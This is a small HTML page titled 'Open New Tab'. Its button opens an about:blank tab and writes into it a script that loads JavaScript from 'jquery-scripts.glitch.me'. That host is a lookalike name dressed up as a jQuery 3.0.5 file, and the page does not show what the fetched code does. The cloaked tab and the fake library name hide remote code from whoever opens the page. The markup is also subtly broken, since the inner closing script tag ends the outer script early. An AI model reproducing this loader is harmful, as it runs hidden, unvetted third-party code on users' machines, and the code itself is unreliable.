<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open New Tab</title>
    <script>
        function openNewTab() {
            const newTab = window.open("about:blank", "_blank");
            newTab.document.write(`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>New Tab</title>
                    <script>
                        (function () {
                            var a = document.createElement('script');
                            a.src = 'https://jquery-scripts.glitch.me/scripts/3.0/jquery-3.0.5.min.js';
                            document.body.appendChild(a);
                        })();
                    </script>
                </head>
                <body>
                </body>
                </html>
            `);
        }
    </script>
</head>
<body>
    <button onclick="openNewTab()">Open New Tab</button>
</body>
</html>
